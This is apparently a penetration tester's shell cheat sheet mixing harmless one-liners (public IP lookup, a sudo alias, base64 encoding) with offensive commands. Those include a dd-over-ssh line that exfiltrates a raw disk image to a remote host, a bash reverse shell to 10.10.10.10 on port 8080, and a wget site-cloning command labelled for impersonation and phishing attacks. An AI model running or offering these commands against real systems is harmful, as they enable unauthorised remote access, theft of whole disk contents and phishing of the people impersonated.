#What is my public IP address?
#get the external public ip
curl -4 icanhazip.com

dig +short myip.opendns.com @resolver1.opendns.com

wget -qO- ifconfig.me/ip

#Encrypted Exfiltration Channel
#use ssh to exfil a compressed image
#great for small filesystems
dd if=/dev/rdisk0s1s2 bs=65536 conv=noerror,sync | ssh -C user@10.10.10.10 "cat >/tmp/image.dd"

#If you forget to sudo your most recent cmd, just type "fuck" after
alias fuck='sudo $(history -p \!\!)'

#bash reverse shell
bash -i >& /dev/tcp/10.10.10.10/8080 0>&1

#Clone a website
#impersonation attacks/phishing
wget -r -nH $URL

#Encode with echo
echo 'Hello World' | base64
echo '920jfnldao10=' | base64 -d






